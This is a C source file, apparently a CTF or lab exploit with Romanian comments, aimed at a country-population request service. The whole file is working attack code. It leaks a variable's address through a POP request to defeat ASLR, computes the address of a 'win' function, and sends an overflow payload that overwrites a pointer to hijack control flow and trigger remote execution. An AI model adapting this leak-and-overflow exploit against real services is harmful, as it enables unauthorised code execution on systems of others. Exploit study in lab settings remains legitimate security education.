#include "request.h"

#define country_len 2064
#define win_add 0x100000fd0
#define pop_add 0x100008338

int main()
{
    int ret;
    struct request add_country = {0};
    struct request trigger_overflow = {0};
    struct request trigger_remote_execution = {0};
    struct request leak = {0};
    char overflow[4 + country_len + 8 + 1] = {0};
    memset(overflow, 'A', country_len + 4 - 1);
    overflow[4 + country_len - 1] = ' ';
    memcpy(overflow + 4 + country_len, "11111111", 8);
    overflow[0] = 'A';
    overflow[1] = 'D';
    overflow[2] = 'D';
    overflow[3] = ' ';
    //printf("%s\n", overflow);

    add_country.message = "ADD test1 0";
    add_country.message_length = strlen(add_country.message);

    leak.message = "POP test1";
    leak.message_length = strlen(leak.message);

    /* ADD test1 0 */
    /* Ne asiguram ca avem o tara cu 0 populatie */
    ret = create_request(&add_country, 1024);
    if (ret != 0)
    {
        puts("Err add_country");
        return -1;
    }

    sleep(1);
    /* POP test1 */
    /* Dam leak la adresa variabilei population */
    ret = create_request(&leak, 1024);
    if (ret != 0)
    {
        puts("Err leak");
        return -1;
    }
    ret = read_response(&leak);
    printf("%d\t%s\n", ret, leak.response);
    uint64_t adresa_population = strtoull(leak.response, NULL, 0);
    uint64_t slide = adresa_population - pop_add;
    uint64_t win = win_add + slide;

    trigger_overflow.message = overflow;
    memcpy(overflow + 4 + country_len - 8 - 1, &win, 8);
    trigger_overflow.message_length = 4 + country_len + 8 + 1;
    create_request(&trigger_overflow, 128);
    sleep(1);
    trigger_remote_execution.message = "POP romania";
    trigger_remote_execution.message_length = 12;
    create_request(&trigger_remote_execution, 128);
    sleep(1);
    update_request(&trigger_overflow, 128);
    sleep(1);

    puts("Triggering remote control");
    trigger_remote_execution.message = "ACK";
    trigger_remote_execution.message_length = 4;
    update_request(&trigger_remote_execution, 1024);
    ret = read_response(&trigger_remote_execution);
    ret = read_response(&trigger_remote_execution);
    printf("%d %s\n", ret, trigger_remote_execution.response);
    sleep(4);
    return 0;
}